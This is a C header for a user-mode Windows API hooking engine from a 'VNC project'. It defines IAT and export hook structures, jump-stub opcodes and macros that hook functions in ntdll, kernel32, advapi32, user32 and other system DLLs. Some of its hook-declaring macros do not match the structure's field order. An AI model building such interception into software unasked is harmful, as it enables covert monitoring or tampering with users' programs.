//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: hook.h
// $Revision: 147 $
// $Date: 2014-01-29 14:10:21 +0400 (Ср, 29 янв 2014) $
// description: 
//	User-mode hoking engine implementation.

#pragma once

// Hook flags
#define HOOK_SET			0x100

#define HF_ORDINAL 1
typedef struct _HOOK_FUNCTION
{
	PCHAR		HokedModule;	// Name of a module where HookedFunction located (exported)
	USHORT      Flags; //HF_ORDINAL

	PCHAR		HookedFunction;	// Name of a hooked function
	USHORT      HookedFunctionOrdinal; // Ordinal of the hooked function

	PVOID		HookFn;			// Hook function
	PVOID		Stub;			// Address of hook stub if used.
	PVOID		Original;		// Address of the original function
} HOOK_FUNCTION, *PHOOK_FUNCTION;

// Hook types
#define HOOK_TYPE_IAT		1
#define HOOK_TYPE_EXPORT	2
#define HOOK_TYPE_MASK		0xff

// setting hook procedure shouldn't fail 
// if export/import hasn't been found
#define HOOK_TYPE_OPTIONAL	0x100 

// Hook structures
typedef struct _HOOK
{
	LIST_ENTRY		Entry;			// Hook list entry
	PVOID			OriginalFn;		// Original function
	PVOID			OriginalEntry;	// Original function entry (for IAT or Export hooks)
	ULONG_PTR		OriginalValue;	// Original value for IDT and Export hooks
	PVOID			HookFn;			// Address of the current hook function
	PHOOK_FUNCTION	pHookFn;
	ULONG			Flags;			// Hook flags
} HOOK, *PHOOK;

typedef struct _HOOK_DESCRIPTOR
{
	PHOOK_FUNCTION	pHookFn;
	PHOOK			pHook;		// Pointer to associated HOOK structure, filed internally by a hooking function
	ULONG			Flags;		// Hook flags (hooking type etc.)
}HOOK_DESCRIPTOR, *PHOOK_DESCRIPTOR;

// Describes number of IAT hooks that should be set on every DLL load
typedef struct _HOOK_DLL_LOAD_NOTIFICATION
{
	LIST_ENTRY			Entry;
	PVOID				pNotificationDescriptor;
	PHOOK_DESCRIPTOR	pHookDescriptor;
	ULONG				NumberHooks;
} HOOK_DLL_LOAD_NOTIFICATION, *PHOOK_DLL_LOAD_NOTIFICATION;

#define OP_JMP_NEAR			0xe9
#define OP_JMP_DWORD_PTR	0x25ff

#pragma pack(push)
#pragma pack(1)
typedef struct _JMP_STUB32
{
	// JMP NEAR XXXX instruction
	UCHAR	Opcode;		// must be 0xe9
	ULONG	Offset;		// jump offset
} JMP_STUB32, *PJMP_STUB32;

typedef struct _JMP_STUB64
{
	// JMP QWORD PTR [$+6]/DQ XXXXXXXX instructions
	USHORT		Opcode;		// must be 0x25ff
	ULONG		Offset;		// must be 0
	ULONG_PTR	Address;	// jump address
} JMP_STUB64, *PJMP_STUB64;


#ifdef _WIN64
	typedef 	JMP_STUB64			JMP_STUB;
	typedef 	PJMP_STUB64			PJMP_STUB;
	#define		JMP_STUB_OPCODE		OP_JMP_DWORD_PTR

#else
	typedef		JMP_STUB32			JMP_STUB;
	typedef		PJMP_STUB32			PJMP_STUB;
	#define		JMP_STUB_OPCODE		OP_JMP_NEAR
#endif

#define OP_POP_EAX 0x58
#define OP_PUSH_DWORD 0x68
#define OP_PUSH_EAX 0x50

// hook struct should be before the stub
typedef struct _CALL_STUB
{
	UCHAR	OpPopEax;		// must be 0x58
	UCHAR	OpPushDword;		// must be 0x68
	ULONG	Ptr;
	UCHAR	OpPushEax;		// must be 0x50
	JMP_STUB Jump;
}CALL_STUB,*PCALL_STUB;

typedef struct _CALL_HOOK
{
	LIST_ENTRY	Entry;			// Hook list entry
	PVOID		OriginalFn;		// Original function
	PVOID		HookFn;
	PVOID		StubFn;
	PVOID		Context;
	PVOID		WndLong; // result of getwindowlong after subclassing
	BOOL		bIsDialog;
	BOOL		bIsModal;
	BOOL		bDeleted;
	BOOL		bReset; // style has been reset
#ifdef _X86_
	CALL_STUB	Stub;
#else
	CHAR Stub[1];
#endif
}CALL_HOOK,*PCALL_HOOK;

#pragma pack(pop)


// Definition of a HOOK_DESCRIPTOR structure
#define DEFINE_HOOK(pHookFn, HookingType)	\
	{pHookFn, NULL, HookingType}
	

// Functions
WINERROR	InitHooks(VOID);
VOID		CleanupHooks(VOID);
WINERROR	SetIatHook(PHOOK_FUNCTION pHookFn, HMODULE ModuleBase, PHOOK* ppHook);
WINERROR	SetExportHook(PHOOK_FUNCTION pHookFn, HMODULE ModuleBase, BOOL bForward, PHOOK* ppHook);
WINERROR	SetMultipleHooks(PHOOK_DESCRIPTOR pHookDesc, LONG NumberHooks, HMODULE ModuleBase);
WINERROR	RemoveMultipleHooks(PHOOK_DESCRIPTOR pHookDesc, LONG NumberHooks);
ULONG		RemoveAllHooks(PHOOK_FUNCTION pHookFn);
VOID		WaitForHooks(VOID);
WINERROR	SetOnDllLoadHooks(PHOOK_DESCRIPTOR pHookDescriptor, ULONG NumberHooks);

INT 
	SetMultipleDllHooks(
		PHOOK_DESCRIPTOR IatHooks, 
		LONG NumberIatHooks ,
		PHOOK_DESCRIPTOR ExportHooks, 
		LONG NumberExportHooks 
		);


PCALL_HOOK AllocateCallStub( PVOID HookFn,PVOID OriginalFn );

extern LONG	volatile	g_HookEnterCount;	

#define ENTER_HOOK()	_InterlockedIncrement(&g_HookEnterCount);
#define LEAVE_HOOK()	_InterlockedDecrement(&g_HookEnterCount);


#define DECLARE_HOOK(_DllName,_FuncName) \
	HOOK_FUNCTION hook_##_DllName##_FuncName = {#_DllName ".dll", 0, #_FuncName, &my_##_FuncName, NULL, NULL}

#define DECLARE_NT_HOOK(FuncName) \
	HOOK_FUNCTION hook_ntdll_Zw##FuncName = {"ntdll.dll", 0, "Zw" #FuncName, 0, &my_Nt##FuncName, NULL, NULL}; \
	HOOK_FUNCTION hook_ntdll_Nt##FuncName = {"ntdll.dll", 0, "Nt" #FuncName, 0, &my_Nt##FuncName, NULL, NULL}

#define DECLARE_A32_HOOK(FuncName) \
	HOOK_FUNCTION hook_advapi32_##FuncName = {"advapi32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_K32_HOOK(FuncName)  \
	HOOK_FUNCTION hook_kernel32_##FuncName = {"kernel32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_U32_HOOK(FuncName) \
	HOOK_FUNCTION hook_user32_##FuncName = {"user32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_G32_HOOK(FuncName) \
	HOOK_FUNCTION hook_gdi32_##FuncName = {"gdi32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_DXGI_HOOK(FuncName) \
	HOOK_FUNCTION hook_dxgi_##FuncName = {"DXGI.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_WINMM_HOOK(FuncName) \
	HOOK_FUNCTION hook_winmm_##FuncName = {"Winmm.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_DSOUND_HOOK(FuncName) \
	HOOK_FUNCTION hook_dsound_##FuncName = {"dsound.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_OLE32_HOOK(FuncName) \
	HOOK_FUNCTION hook_ole32_##FuncName = {"ole32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_SHELL32_HOOK(FuncName) \
	HOOK_FUNCTION hook_shell32_##FuncName = {"Shell32.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_UXTHEME_HOOK(FuncName) \
	HOOK_FUNCTION hook_UxTheme_##FuncName = {"UxTheme.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_KERNELBASE_HOOK(FuncName) \
	HOOK_FUNCTION hook_KernelBase_##FuncName = {"KernelBase.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_COMBASE_HOOK(FuncName) \
	HOOK_FUNCTION hook_combase_##FuncName = {"combase.dll", 0, #FuncName, 0, &my_##FuncName, NULL, NULL}
#define DECLARE_NULL_HOOK(FuncName) \
	HOOK_FUNCTION hook_null_##FuncName = {NULL, 0, #FuncName, 0, &my_##FuncName, NULL, NULL}

#define DECLARE_HOOK_ORDINAL(_X,_DllName,_FuncName,_FuncNum) \
	HOOK_FUNCTION hook_##_DllName##_FuncName = \
		{#_DllName ".dll", HF_ORDINAL, _FuncNum, _FuncName, &my_##_FuncName, NULL, NULL}

#define DECLARE_NULL_HOOK_ORDINAL(FuncName,_FuncNum) \
	HOOK_FUNCTION hook_null_##FuncName = \
		{NULL, 0, #FuncName, _FuncNum, &my_##FuncName, NULL, NULL}

#define	DEFINE_NT_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HOOK_TYPE_IAT)
#define	DEFINE_NT_IAT_HOOK_OP(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_A32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_advapi32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_A32_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_advapi32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_K32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_kernel32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_K32_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_kernel32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_U32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_user32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_U32_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_user32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_G32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_gdi32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_G32_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_gdi32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_DXGI_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_dxgi_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_DXGI_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_dxgi_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_WINMM_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_winmm_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_WINMM_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_winmm_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_DSOUND_IAT_HOOK(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_DSOUND_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_OLE32_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_ole32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_OLE32_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_ole32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_SHELL32_IAT_HOOK(FuncName)	DEFINE_HOOK(&hook_shell32_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_SHELL32_IAT_HOOK_OP(FuncName) DEFINE_HOOK(&hook_shell32_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_UXTHEME_IAT_HOOK(FuncName)	DEFINE_HOOK(&hook_UxTheme_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_UXTHEME_IAT_HOOK_OP(FuncName) DEFINE_HOOK(&hook_UxTheme_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_NULL_IAT_HOOK(FuncName)		DEFINE_HOOK(&hook_null_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_NULL_IAT_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_null_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_KERNELBASE_IAT_HOOK(FuncName) DEFINE_HOOK(&hook_KernelBase_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_KERNELBASE_IAT_HOOK_OP(FuncName) DEFINE_HOOK(&hook_KernelBase_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)
#define DEFINE_COMBASE_IAT_HOOK(FuncName)    DEFINE_HOOK(&hook_combase_##FuncName, HOOK_TYPE_IAT)
#define DEFINE_COMBASE_IAT_HOOK_OP(FuncName) DEFINE_HOOK(&hook_combase_##FuncName, HOOK_TYPE_IAT|HOOK_TYPE_OPTIONAL)

#define DEFINE_NT_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_NT_EXP_HOOK_OP(FuncName)		DEFINE_HOOK(&hook_ntdll_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_A32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_advapi32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_A32_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_advapi32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_K32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_kernel32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_K32_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_kernel32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_U32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_user32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_U32_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_user32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_G32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_gdi32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_G32_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_gdi32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_DXGI_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_dxgi_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_DXGI_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_dxgi_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_WINMM_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_winmm_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_WINMM_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_winmm_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_DSOUND_EXP_HOOK(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_DSOUND_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_dsound_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_OLE32_EXP_HOOK(FuncName)		DEFINE_HOOK(&hook_ole32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_OLE32_EXP_HOOK_OP(FuncName)	DEFINE_HOOK(&hook_ole32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_SHELL32_EXP_HOOK(FuncName)	DEFINE_HOOK(&hook_shell32_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_SHELL32_EXP_HOOK_OP(FuncName) DEFINE_HOOK(&hook_shell32_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_UXTHEME_EXP_HOOK(FuncName)	DEFINE_HOOK(&hook_UxTheme_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_UXTHEME_EXP_HOOK_OP(FuncName) DEFINE_HOOK(&hook_UxTheme_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_KERNELBASE_EXP_HOOK(FuncName) DEFINE_HOOK(&hook_KernelBase_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_KERNELBASE_EXP_HOOK_OP(FuncName) DEFINE_HOOK(&hook_KernelBase_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)
#define DEFINE_COMBASE_EXP_HOOK(FuncName)    DEFINE_HOOK(&hook_combase_##FuncName, HOOK_TYPE_EXPORT)
#define DEFINE_COMBASE_EXP_HOOK_OP(FuncName)    DEFINE_HOOK(&hook_combase_##FuncName, HOOK_TYPE_EXPORT|HOOK_TYPE_OPTIONAL)

#define DEFINE_NT_PROC(FuncName)			((ptr_##FuncName)hook_ntdll_##FuncName.Original)
#define DEFINE_A32_PROC(FuncName)			((ptr_##FuncName)hook_advapi32_##FuncName.Original)
#define DEFINE_U32_PROC(FuncName)			((ptr_##FuncName)hook_user32_##FuncName.Original)
#define DEFINE_K32_PROC(FuncName)			((ptr_##FuncName)hook_kernel32_##FuncName.Original)
#define DEFINE_G32_PROC(FuncName)			((ptr_##FuncName)hook_gdi32_##FuncName.Original)
#define DEFINE_WINMM_PROC(FuncName)			((ptr_##FuncName)hook_winmm_##FuncName.Original)
#define DEFINE_DSOUND_PROC(FuncName)		((ptr_##FuncName)hook_dsound_##FuncName.Original)
#define DEFINE_OLE32_PROC(FuncName)			((ptr_##FuncName)hook_ole32_##FuncName.Original)
#define DEFINE_SHELL32_PROC(FuncName)		((ptr_##FuncName)hook_shell32_##FuncName.Original)
#define DEFINE_UXTHEME_PROC(FuncName)		((ptr_##FuncName)hook_UxTheme_##FuncName.Original)
#define DEFINE_KERNELBASE_PROC(FuncName)	((ptr_##FuncName)hook_KernelBase_##FuncName.Original)
#define DEFINE_COMBASE_PROC(FuncName)		((ptr_##FuncName)hook_combase_##FuncName.Original)

#define EXTERN_NT_HOOK(FuncName)			extern HOOK_FUNCTION hook_ntdll_##FuncName
#define EXTERN_U32_HOOK(FuncName)			extern HOOK_FUNCTION hook_user32_##FuncName
#define EXTERN_G32_HOOK(FuncName)			extern HOOK_FUNCTION hook_gdi32_##FuncName
#define EXTERN_K32_HOOK(FuncName)			extern HOOK_FUNCTION hook_kernel32_##FuncName
#define EXTERN_WINMM_HOOK(FuncName)			extern HOOK_FUNCTION hook_winmm_##FuncName
#define EXTERN_DSOUND_HOOK(FuncName)		extern HOOK_FUNCTION hook_dsound_##FuncName
#define EXTERN_OLE32_HOOK(FuncName)			extern HOOK_FUNCTION hook_ole32_##FuncName
#define EXTERN_SHELL32_HOOK(FuncName)		extern HOOK_FUNCTION hook_shell32_##FuncName
#define EXTERN_UXTHEME_HOOK(FuncName)		extern HOOK_FUNCTION hook_UxTheme_##FuncName
#define EXTERN_KERNELBASE_HOOK(FuncName)	extern HOOK_FUNCTION hook_KernelBase_##FuncName
#define EXTERN_COMBASE_HOOK(FuncName)		extern HOOK_FUNCTION hook_combase_##FuncName